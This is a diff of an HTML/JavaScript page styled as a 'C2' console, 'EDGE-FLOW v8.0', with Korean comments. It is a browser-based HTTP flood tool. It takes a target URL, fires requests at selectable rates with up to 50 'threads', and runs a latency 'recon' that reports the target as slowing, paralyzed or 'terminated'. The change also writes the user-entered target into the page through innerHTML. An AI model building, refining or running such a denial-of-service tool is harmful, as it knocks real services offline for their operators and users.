@@ -2,66 +2,64 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>☢️ EDGE-FLOW v6.5 RECON-DESTROY</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>☢️ EDGE-FLOW v8.0 PRECISION</title>
     <style>
         :root { --neon: #00ff41; --bg: #050505; --warn: #ff3e3e; --scan: #00d4ff; --recon: #f0f000; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-        .header { border-bottom: 2px solid var(--neon); padding-bottom: 10px; margin-bottom: 20px; text-shadow: 0 0 10px var(--neon); display: flex; justify-content: space-between; align-items: center; }
-        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; background: #111; padding: 20px; border: 1px solid #333; border-radius: 10px; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 15px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        .header { border-bottom: 2px solid var(--neon); padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; background: #111; padding: 12px; border: 1px solid #333; border-radius: 8px; }
         .full-width { grid-column: span 2; }
-        label { display: block; margin-bottom: 5px; font-size: 0.8em; color: #888; }
-        input, select { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; box-sizing: border-box; font-size: 1.1em; outline: none; }
-        .btn-group { display: flex; gap: 10px; margin-top: 20px; flex-wrap: wrap; }
-        button { flex: 1; min-width: 140px; padding: 15px; font-weight: bold; cursor: pointer; border: none; transition: 0.2s; font-size: 1.1em; text-transform: uppercase; }
-        #startBtn { background: var(--neon); color: #000; }
+        label { display: block; margin-bottom: 2px; font-size: 0.7em; color: #888; }
+        input, select { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 10px; width: 100%; box-sizing: border-box; font-size: 0.95em; outline: none; }
+        .btn-group { display: grid; grid-template-columns: 1.5fr 1fr 1fr; gap: 8px; margin-top: 10px; }
+        button { padding: 15px 5px; font-weight: bold; cursor: pointer; border: none; transition: 0.2s; font-size: 0.9em; text-transform: uppercase; border-radius: 4px; }
+        #startBtn { background: var(--neon); color: #000; box-shadow: 0 0 10px rgba(0, 255, 65, 0.4); }
         #reconBtn { background: var(--recon); color: #000; }
         #stopBtn { background: var(--warn); color: #fff; }
-        #terminal { flex-grow: 1; background: #000; border: 1px solid #222; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 11px; border-radius: 5px; box-shadow: inset 0 0 15px #000; }
-        .log-entry { margin-bottom: 4px; border-left: 3px solid var(--neon); padding-left: 8px; animation: flash 0.3s; }
-        .log-err { color: var(--warn); border-left-color: var(--warn); }
-        .log-scan { color: var(--scan); border-left-color: var(--scan); }
-        .log-recon { color: var(--recon); border-left-color: var(--recon); font-weight: bold; }
-        @keyframes flash { from { background: rgba(0,255,65,0.2); } to { background: transparent; } }
-        .stats { font-size: 0.9em; color: #888; }
+        #terminal { flex-grow: 1; background: #000; border: 1px solid #222; margin-top: 15px; padding: 10px; overflow-y: auto; font-size: 11px; border-radius: 5px; box-shadow: inset 0 0 15px #000; }
+        .log-entry { margin-bottom: 4px; border-left: 3px solid var(--neon); padding-left: 8px; }
+        .log-err { color: var(--warn); border-left-color: var(--warn); font-weight: bold; }
+        .log-recon { color: var(--recon); border-left-color: var(--recon); background: rgba(240, 240, 0, 0.05); }
+        .status-badge { padding: 2px 5px; border-radius: 3px; font-weight: bold; margin-right: 5px; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>[ EDGE-FLOW C2 v6.5 - RECON ]</h1>
-        <div class="stats">
-            STATUS: <span id="statusText">STANDBY</span> | 
-            LOAD: <span id="shotCount">0</span>
+        <h2 style="margin:0; font-size: 1.1em;">[ EDGE-FLOW C2 v8.0 ]</h2>
+        <div style="text-align: right; font-size: 0.8em;">
+            <span id="statusText">READY</span> | <span id="shotCount">0</span> PKTS
         </div>
     </div>
 
     <div class="controls">
         <div class="full-width">
-            <label>TARGET IP / URL</label>
+            <label>TARGET URL (http:// 필수)</label>
             <input type="text" id="target" value="http://" placeholder="http://1.2.3.4">
         </div>
         <div>
-            <label>FIRE RATE</label>
+            <label>RATE</label>
             <select id="rate">
-                <option value="50" selected>OVERLOAD (50ms)</option>
-                <option value="200">STEALTH (200ms)</option>
+                <option value="50">MAX (50ms)</option>
+                <option value="150" selected>STEADY (150ms)</option>
             </select>
         </div>
         <div>
-            <label>POWER THREADS</label>
+            <label>THREADS</label>
             <select id="threads">
-                <option value="50" selected>GOD MODE (50x)</option>
-                <option value="10">LOW (10x)</option>
+                <option value="50" selected>GOD (50x)</option>
+                <option value="20">MID (20x)</option>
             </select>
         </div>
     </div>
 
     <div class="btn-group">
-        <button id="startBtn" onclick="initiate()">MISSION START</button>
-        <button id="reconBtn" onclick="checkTargetStatus()">CHECK TARGET</button>
+        <button id="startBtn" onclick="initiate()">FIRE</button>
+        <button id="reconBtn" onclick="analyzeTarget()">RECON</button>
         <button id="stopBtn" onclick="terminate()">STOP</button>
     </div>
 
-    <div id="terminal">>> SYSTEM INITIALIZED. READY FOR COMMAND.</div>
+    <div id="terminal">>> SYSTEM SECURED. WAITING FOR COMMAND...</div>
 
     <script>
         let attackInterval = null;
@@ -70,46 +68,53 @@
         function log(msg, type = 'info') {
             const term = document.getElementById('terminal');
             const div = document.createElement('div');
-            div.className = `log-entry ${type === 'error' ? 'log-err' : type === 'scan' ? 'log-scan' : type === 'recon' ? 'log-recon' : ''}`;
-            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            div.className = `log-entry ${type === 'error' ? 'log-err' : type === 'recon' ? 'log-recon' : ''}`;
+            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
             term.prepend(div);
-            if (term.childNodes.length > 60) term.removeChild(term.lastChild);
+            if (term.childNodes.length > 50) term.removeChild(term.lastChild);
         }
 
-        // [정찰 기능] 별도의 버튼으로 동작
-        async function checkTargetStatus() {
+        async function analyzeTarget() {
             const target = document.getElementById('target').value.trim();
-            if (!target.startsWith('http')) { log("ENTER VALID TARGET FIRST", "error"); return; }
+            if (!target.startsWith('http')) { log("URL ERROR", "error"); return; }
             
-            log("📡 SENDING RECONNAISSANCE DRONE...", "recon");
-            const startTime = Date.now();
+            log("📡 INITIATING PRECISION SCAN...", "recon");
+            const start = Date.now();
 
             try {
                 const controller = new AbortController();
-                const timeout = setTimeout(() => controller.abort(), 4000); // 4초 후 타임아웃
+                const timeout = setTimeout(() => controller.abort(), 6000);
+
+                // no-cors 모드로 응답 시간만 체크
+                await fetch(`${target}/?t=${Date.now()}`, { mode: 'no-cors', cache: 'no-store', signal: controller.signal });
                 
-                // 공격 패킷이 아닌 순수 상태 체크
-                await fetch(target, { mode: 'no-cors', cache: 'no-store', signal: controller.signal });
-                const latency = Date.now() - startTime;
-                
-                if (latency > 1500) {
-                    log(`⚠️ TARGET STRUGGLING! (Latency: ${latency}ms)`, "recon");
-                } else {
-                    log(`🟢 TARGET RESPONDING (Latency: ${latency}ms)`, "recon");
-                }
+                const ms = Date.now() - start;
                 clearTimeout(timeout);
+                report(ms);
             } catch (e) {
-                log("💀 TARGET UNRESPONSIVE! 격침 확인 완료.", "error");
+                if (e.name === 'AbortError') log("<span class='status-badge' style='background:red;color:#fff'>💀 TERMINATED</span> 타겟 응답 없음. 격침 확인!", "error");
+                else {
+                    const ms = Date.now() - start;
+                    if (ms < 1000) report(ms); // 보안 정책 에러라도 시간 빠르면 생존
+                    else log(`<span class='status-badge' style='background:orange'>🔴 CRITICAL</span> Latency: ${ms}ms - 마비 임계점.`, "error");
+                }
             }
+        }
+
+        function report(ms) {
+            if (ms < 150) log(`<span class='status-badge' style='background:green;color:#fff'>🟢 NORMAL</span> Latency: ${ms}ms - 매우 건재함.`, "recon");
+            else if (ms < 500) log(`<span class='status-badge' style='background:yellow;color:#000'>🟡 SLOWING</span> Latency: ${ms}ms - 부하 발생 중.`, "recon");
+            else if (ms < 1500) log(`<span class='status-badge' style='background:orange;color:#fff'>🟠 HEAVY</span> Latency: ${ms}ms - 치명적인 렉 발생!`, "recon");
+            else log(`<span class='status-badge' style='background:red;color:#fff'>🔴 PARALYZED</span> Latency: ${ms}ms - 서비스 불능 상태.`, "error");
         }
 
         async function initiate() {
             const target = document.getElementById('target').value.trim();
-            if (!target.startsWith('http')) { log("INVALID TARGET", "error"); return; }
+            if (!target.startsWith('http')) { log("URL ERROR", "error"); return; }
 
-            document.getElementById('statusText').innerText = "ANNIHILATING";
+            document.getElementById('statusText').innerText = "FIRING";
             document.getElementById('statusText').style.color = "red";
-            log(`🚀 FIRE! TARGET LOCK-ON: ${target}`);
+            log(`🚀 TOTAL WAR DECLARED ON ${target}`);
 
             const rate = parseInt(document.getElementById('rate').value);
             const threads = parseInt(document.getElementById('threads').value);
@@ -127,9 +132,9 @@
 
         function terminate() {
             clearInterval(attackInterval);
-            document.getElementById('statusText').innerText = "STANDBY";
+            document.getElementById('statusText').innerText = "READY";
             document.getElementById('statusText').style.color = "var(--neon)";
-            log("!!! MISSION STOPPED !!!", "error");
+            log("🛑 CEASE FIRE.", "error");
         }
     </script>
 </body>
